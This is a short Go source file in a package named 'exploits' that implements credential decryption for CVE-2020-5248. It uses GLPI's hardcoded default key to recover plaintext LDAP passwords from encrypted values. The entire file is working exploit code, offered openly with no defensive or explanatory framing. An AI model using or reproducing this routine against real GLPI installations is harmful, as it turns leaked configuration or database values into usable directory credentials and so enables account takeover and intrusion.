package exploits

import (
	"encoding/base64"
)

// CVE-2020-5248
func DecryptLDAP(str string, key string) string {
	defaultKey := "GLPI£i'snarss'ç"
	if key == "" {
		key = defaultKey
	}
	result := ""
	test := str
	stringBytes, _ := base64.StdEncoding.DecodeString(test)
	test = string(stringBytes)
	for i := 0; i < len(test); i++ {
		char := test[i : i+1]
		keyIndex := (i % len(key))
		if keyIndex == 0 {
			keyIndex = len(key)
		}
		keychar := key[keyIndex-1 : keyIndex]
		temp := char[0] - keychar[0]
		result += string(temp)
	}
	return result
}
